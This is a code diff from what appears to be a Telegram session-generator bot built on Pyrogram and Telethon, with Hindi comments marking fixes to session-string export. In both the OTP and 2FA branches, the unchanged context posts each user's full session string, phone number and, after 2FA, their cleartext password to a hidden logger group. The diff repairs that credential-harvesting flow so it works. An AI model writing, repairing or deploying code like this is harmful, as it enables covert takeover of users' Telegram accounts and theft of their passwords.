@@ -85,10 +85,10 @@ async def process_input(event):
         try:
             if isinstance(client, PyroClient):
                 await client.sign_in(phone_number, phone_code_hash, otp_code)
+                session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
             else:
                 await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
-
-            session_string = client.export_session_string()
+                session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
 
@@ -111,10 +111,10 @@ async def process_input(event):
         try:
             if isinstance(client, PyroClient):
                 await client.check_password(password)
+                session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
             else:
                 await client.sign_in(password=password)
-
-            session_string = client.export_session_string()
+                session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (with 2FA)!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")
 
